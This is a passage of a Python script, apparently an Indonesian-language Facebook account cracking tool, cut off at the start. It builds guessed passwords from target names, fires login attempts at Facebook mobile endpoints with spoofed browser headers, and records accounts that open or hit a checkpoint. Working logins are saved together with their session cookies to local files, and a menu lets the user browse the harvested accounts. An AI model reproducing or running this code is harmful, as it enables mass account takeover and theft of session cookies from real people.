						pasw.append(
							namd
							+
							'12345'
						)
				if 'bade' in pwp:
					for xpwd in pwt:
						pasw.append(
							xpwd
						)
				else:
					pass
				MethodCrack.submit(
					Valid,
					user,
					pasw,
					nmfl
				)
		print(
		)
	Console(width=48).print(
		Panel(
			f'[bold #FF00D4]crack selesai akun ok: [bold #00FF00]{ok} [bold #FF00D4]akun cp: [bold #FFFF00]{cp}',
			width=48,
			style=f"bold purple"
			),
		justify="center"
		)
	exit(
	)
def Konversi(cookie):
	kueh = (
		'datr=%s;sb=%s;ps_l=0;ps_n=0;c_user=%s;xs=%s;fr=%s'
		%
		(
			cookie[
				'datr'
			],
			cookie[
				'sb'
			],
			cookie[
				'c_user'
			],
			cookie[
				'xs'
			],
			cookie[
				'fr'
			]
		)
	)
	return(
		str(
			kueh
		)
	)
def Valid(user,pasw,nmfl):
	global loop,ok,cp
	prog.update(des,description=f"[bold #FF00D4]{loop}[bold #FFFFFF]=[bold #FF00D4]{len(id)} [bold ##FFFFFF]{user} [bold #FFFFFF]ok:[bold #80FF00]{ok}[bold #FFFFFF] cp:[bold #FFFF00]{cp}[/]")
	prog.advance(des)
	for pw in pasw:
		try:
			ses = requests.Session(); ua = rc([User_Agent,UserAgent])
			url = (f'{rc(["free","m"])}.{rc(["prod","latest"])}.facebook.com')
			bhs = rc(['id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'bd-BD,bd;q=0.9,en-US;q=0.8,en;q=0.7', 'en-GB,en;q=0.9,en-US;q=0.8,en;q=0.7', 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'])
			link = ses.get("https://{url}/login.php?skip_api_login=1&api_key=360769957454434&kid_directed_site=0&app_id=360769957454434&signed_next=1&next=https%3A%2F%2F{url}%2Fv2.12%2Fdialog%2Foauth%3Fclient_id%3D360769957454434%26state%3D4cddf02639ee86595c0627a2c42e7f93%26response_type%3Dcode%26sdk%3Dphp-sdk-5.3.1%26redirect_uri%3Dhttps%253A%252F%252Fmyanimelist.net%252Fsns%252Fcallback%252Ffacebook%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D10d9f828-1420-4511-abbf-8e233d701913%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmyanimelist.net%2Fsns%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D4cddf02639ee86595c0627a2c42e7f93%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			date = {
				"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
				"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
				"uid": user,
				"next": "https://"+url+"/login/save-device/",
				"flow": "login_no_pin",
				"pass": pw,}
			kueh = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
			head = {
				'Host': url,
				'cache-control': 'max-age=0',
				'upgrade-insecure-requests': '1',
				'origin': 'https://'+url,
				'content-type': 'application/x-www-form-urlencoded',
				'x-requested-with': 'XMLHttpRequest',
				'user-agent': ua,
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'navigate',
				'sec-fetch-user': '?1',
				'sec-fetch-dest': 'document',
				'dpr': str(rr(1,5)),
				'viewport-width': str(rr(300,999)),
				'sec-ch-ua': '"Not)A;Brand";v="{}", "Chromium";v="{}"'.format(str(rr(8,24)), re.search(r'Chrome/(\d+)', str(ua)).group(1)),
				'sec-ch-ua-mobile': '?1',
				'sec-ch-ua-platform': '"Android"',
				'sec-ch-ua-platform-version': '"{}.0.0"'.format(re.search(r'Android (\d+)', ua).group(1)),
				'sec-ch-ua-full-version-list': '"Not)A;Brand";v="{}.0.0.0", "Chromium";v="{}"'.format(str(rr(8,24)), re.search(r'Chrome/(\d+\.\d+\.\d+\.\d+)', str(ua)).group(1)),
				'sec-ch-prefers-color-scheme': 'dark',
				'referer': link.url,
				'accept-encoding': 'gzip, deflate, br',
				'accept-language': bhs,}
			sign = ses.post('https://'+url+'/login/device-based/validate-password/?shbl=0&locale2=id_ID',
				data = date,
				headers = head,
				cookies = {
					'cookie'
					:
					kueh
				},
				allow_redirects = False
				)
			if "checkpoint" in ses.cookies.get_dict():
				tree = Tree(
					"",
					guide_style="bold purple"
				)
				true = tree.add(
					Panel(
						"[bold #FFFF00]login akun facebook cekpoint",
						subtitle="* ᴅᴀᴛᴀ *",
						subtitle_align="left",
						width=32,
						style="bold purple"
					)
				).add(
					f"[bold #FFFF00]ᴜʀʟᴡᴇʙ: [#FFFFFF]{url}"
					,style="bold purple"
				)
				true.add(
					f"[bold #FFFF00]ɴɴ: [#FFFFFF]{nmfl}",
					style="bold purple"
				)
				true.add(
					f"[bold #FFFF00]ɪᴅ: [#FFFFFF]{user}",
					style="bold purple"
				)
				true.add(
					f"[bold #FFFF00]ᴘᴡ: [#FFFFFF]{pw}",
					style="bold purple"
				)
				true = tree.add(
					Panel(
						f"[bold #FF00D4]{ua}",
						title="* ᴜɢᴇɴ *",
						title_align="left",
						width=84,style="bold purple"
					)
				)
				true.add(
					Panel(
						"[bold #FFFF00]silahkan check di lite/mbasic barangkali opsi checkpointnya dapat dibuka!",
						title="* ɪɴғᴏ *",
						title_align="left",
						width=80,
						style="bold purple"
					)
				)
				Cetak(
					tree
				)
				open(
					'CP/'
					+
					cpc,
					'a'
					).write(
					user
					+
					'|'
					+
					pw
					+
					'\n'
				)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict():
				kuki = Konversi(
					ses.cookies.get_dict()
				)
				tree = Tree(
					"",
					guide_style="bold purple"
				)
				true = tree.add(
					Panel(
						"[bold #00FF00]login akun facebook berhasil",
						subtitle="* ᴅᴀᴛᴀ *",
						subtitle_align="left",
						width=32,
						style="bold purple"
					)
				).add(
					f"[bold #00FF00]ᴜʀʟᴡᴇʙ: [#FFFFFF]{url}"
					,style="bold purple"
				)
				true.add(
					f"[bold #00FF00]ɴɴ: [#FFFFFF]{nmfl}",
					style="bold purple"
				)
				true.add(
					f"[bold #00FF00]ɪᴅ: [#FFFFFF]{user}",
					style="bold purple"
				)
				true.add(
					f"[bold #00FF00]ᴘᴡ: [#FFFFFF]{pw}",
					style="bold purple"
				)
				true = tree.add(
					Panel(
						f"[bold #FF00D4]{ua}",
						title="* ᴜɢᴇɴ *",
						title_align="left",
						width=84,style="bold purple"
					)
				)
				true.add(
					Panel(
						f"[bold #00FF00]{kuki}",
						title="* ᴋᴜᴇʜ *",
						title_align="left",
						width=80,
						style="bold purple"
					)
				)
				Cetak(
					tree
				)
				open(
					'OK/'
					+
					okc,
					'a'
					).write(
					user
					+
					'|'
					+
					pw
					+
					'|'
					+
					kuki
					+
					'|'
					+
					ua
					+
					'\n'
				)
				ok+=1
				break
			else: continue
		except (requests.exceptions.ConnectionError): sleep(30)
	loop +=1
def Hasil_OkCp():
	Colom3 = [
	]
	Console(width=48).print(
		Panel(
			"[bold #FF00D4]menu cek hasil crack",
			style="bold purple",
			),
		justify="center"
		)
	Colom3.append(
		Panel(
			"[bold #FF00D4] 1.hasil ok",
			width=15,
			style="bold purple",
		)
	)
	Colom3.append(
		Panel(
			"[bold #FF00D4] 2.hasil cp",
			width=16,
			style="bold purple",
		)
	)
	Colom3.append(
		Panel(
			"[bold #FF00D4] 3.kembali",
			width=15,
			style="bold purple",
		)
	)
	Console(width=48).print(
		Columns(
			Colom3
			),
		justify="center"
	)
	Console(width=48).print(
		Panel(
			'[bold #FF00D4]input menu (1/2/3)',
			width=48,
			subtitle="╭──",
			subtitle_align="left",
			style="bold purple"
			),
		justify="center"
	)
	Choose = Console().input(
		'[bold purple]   ╰─> '
		)
	if Choose in ('1'):
		try:
			Cari = os.listdir(
				'OK'
			)
		except FileNotFoundError:
			Console(width=48).print(
				Panel(
					"[bold #FF00D4]file tidak ada",
					width=48,
					style="bold purple"
					),
				justify="center"
			)
			sleep(
				3
				)
			Back_Menu(
			)
		if len(Cari) == 0:
			Console(width=48).print(
				Panel(
					"[bold #FF00D4]file kosong, crack dahulu",
					width=48,
					style="bold purple"
					),
				justify="center"
			)
			sleep(
				2
				)
			Back_Menu(
			)
		else:
			Console(width=48).print(
				Panel(
					"[bold #FF00D4]daftar hasil akun ok anda",
					width=48,
					style="bold purple"
					),
				justify="center"
			)
			Htg = 0
			Fns = {}
			for Data in Cari:
				try:
					Isi = open('OK/'+Data,'r').readlines()
				except:
					continue
				Htg+=1
				if Htg < 10:
					Nom = (
						''
						+
						str(
							Htg
						)
					)
					Fns.update(
						{
							str(
								Htg
							)
							:
							str(
								Data
							)
						}
					)
					Fns.update(
						{
							Nom
							:
							str(
								Data
							)
						}
					)
					Console().print(
						'[bold #FF00D4] ➛ [#FFFFFF]0'
						+
						Nom
						+
						'[#FFFFFF]. '
						+
						Data
						+
						'[bold #00FF00] '
						+
						str(
							len(
								Isi
							)
						)
						+
						'[#FFFFFF] akun'
					)
				else:
					Fns.update(
						{
							str(
								Htg
							)
							:
							str(
								Data
							)
						}
					)
					Console().print(
						'[bold #FF00D4] ➛ [#FFFFFF]'
						+
						str(
							Htg
						)
						+
						'. '
						+
						Data
						+
						'[bold #00FF00] '
						+
						str(
							len(
								Isi
							)
						)
						+
						'[#FFFFFF] akun'
					)
			Console(width=48).print(
				Panel(
					"[bold #FF00D4]input nomer daftar hasil diatas",
					width=48,
					subtitle="╭──",
					subtitle_align="left",
					style="bold purple"
					),
				justify="center"
			)
			View = Console().input(
				'[bold purple]   ╰─> '
				)
			try:
				Liat = Fns[
					View
				]
			except KeyError:
				Console(width=48).print(
					Panel(
						"[bold #FF00D4]macam tak betul budek ni",
						width=48,
						style="bold purple"
						),
					justify="center"
				)
				sleep(
					2
					)
				Back_Menu(
				)
			try:
				Cari2 = open(
					'OK/'
					+
					Liat,
					'r'
				).read().splitlines()
			except:
				Console(width=48).print(
					Panel(
						"[bold #FF00D4]file tidak ada",
						width=48,
						style="bold purple"
						),
					justify="center"
				)
				sleep(
					2
					)
				Back_Menu(
				)
			HtgCp = 0
			for Cpku in range(len(Cari2)):
				Cpny = Cari2[
					HtgCp
					].split('|')
				tree = Tree(
					""
				)
				tree.add(
					"\r[bold #00FF00]Account Succesfully"
					).add(
					f"\r[bold purple]{Cpny[0]}|{Cpny[1]}"
					).add(
					f"\r[bold purple]{Cpny[2]}"
					,style="bold white"
				)
				tree.add(
					f"\r[white]{Cpny[3]}"
					,style="bold #00FF00"
				)
				Cetak(
					tree
				)
				HtgCp +=1
			print(
				''
			)
			Console(width=48).print(
				Panel(
					'[bold #FF00D4]cek selesai, enter untuk ke menu',
					width=48,
					subtitle="╭──",
					subtitle_align="left",
					style="bold purple"
					),
				justify="center"
			)
			Console().input(
				'[bold purple]   ╰─> '
				)
			Back_Menu(
			)
	elif Choose in ('2'):
		try:
			Cari = os.listdir(
				'CP'
			)
		except FileNotFoundError:
			Console(width=48).print(
				Panel(
					"[bold #FF00D4]file tidak ada",
					width=48,
					style="bold purple"
					),
				justify="center"
			)
			sleep(
				3
				)
			Back_Menu(
			)
		if len(Cari) == 0:
			Console(width=48).print(
				Panel(
					"[bold #FF00D4]file kosong, crack dahulu",
					width=48,
					style="bold purple"
					),
				justify="center"
			)
			sleep(
				2
				)
			Back_Menu(
			)
		else:
			Console(width=48).print(
				Panel(
					"[bold #FF00D4]daftar hasil akun cp anda",
					width=48,
					style="bold purple"
					),
				justify="center"
			)
			Htg = 0
			Fns = {}
			for Data in Cari:
				try:
					Isi = open('CP/'+Data,'r').readlines()
				except:
					continue
				Htg+=1
				if Htg < 10:
					Nom = (
						''
						+
						str(
							Htg
						)
					)
					Fns.update(
						{
							str(
								Htg
							)
							:
							str(
								Data
							)
						}
					)
					Fns.update(
						{
							Nom
							:
							str(
								Data
							)
						}
					)
					Console().print(
						'[bold #FF00D4] ➛ [bold #FFFFFF]0'
						+
						Nom
						+
						'[#FFFFFF]. '
						+
						Data
						+
						'[bold #FFF000] '
						+
						str(
							len(
								Isi
							)
						)
						+
						'[#FFFFFF] akun'
					)
				else:
					Fns.update(
						{
							str(
								Htg
							)
							:
							str(
								Data
							)
						}
					)
					Console().print(
						'[bold #FF00D4] ➛ [#FFFFFF]'
						+
						str(
							Htg
						)
						+
						'. '
						+
						Data
						+
						'[bold #FFF000] '
						+
						str(
							len(
								Isi
							)
						)
						+
						'[#FFFFFF] akun'
					)
			Console(width=48).print(
				Panel(
					"[bold #FF00D4]input nomer daftar hasil diatas",
					width=48,
					subtitle="╭──",
					subtitle_align="left",
					style="bold purple"
					),
				justify="center"
			)
			View = Console().input(
				'[bold purple]   ╰─> '
			)
			try:
				Liat = Fns[
					View
				]
			except KeyError:
				Console(width=48).print(
					Panel(
						"[bold #FF00D4]macam tak betul budek ni",
						width=48,
						style="bold purple"
						),
					justify="center"
				)
				sleep(
					2
					)
				Back_Menu(
				)
			try:
				Cari2 = open(
					'CP/'
					+
					Liat,
					'r'
				).read().splitlines()
			except:
				Console(width=48).print(
					Panel(
						"[bold #FF00D4]file tidak ada",
						width=48,
						style="bold purple"
						),
					justify="center"
				)
				sleep(
					2
					)
				Back_Menu(
				)
			HtgCp = 0
			for Cpku in range(len(Cari2)):
				Cpny = Cari2[
					HtgCp
					].split('|')
				tree = Tree("")
				tree.add(
					"\r[bold #FFFF00]Account Checkpoint"
					).add(
					f"\r[bold #FF0000]{Cpny[0]}|{Cpny[1]}"
					,style="bold #FFF000"
				)
				Cetak(
					tree
				)
				HtgCp +=1
			print(
				''
			)
			Console(width=48).print(
				Panel(
					'[bold #FF00D4]cek selesai, enter untuk ke menu',
					width=48,
					subtitle="╭──",
					subtitle_align="left",
					style="bold purple"
					),
				justify="center"
			)
			Console().input(
				'[bold purple]   ╰─> '
				)
			Back_Menu(
			)
	elif Choose in ('3'):
		Back_Menu(
		)
	else:
		Console(width=48).print(
			Panel(
				"[bold #FF00D4]macam tak betul budek ni",
				width=48,
				style="bold purple"
				),
			justify="center"
		)
		sleep(
			1
			)
		exit(
	)
if __name__=='__main__':
	try:
		os.mkdir(
			'OK'
		)
	except:
		pass
	try:
		os.mkdir(
			'CP'
		)
	except:
		pass
	Main_Menu(
)
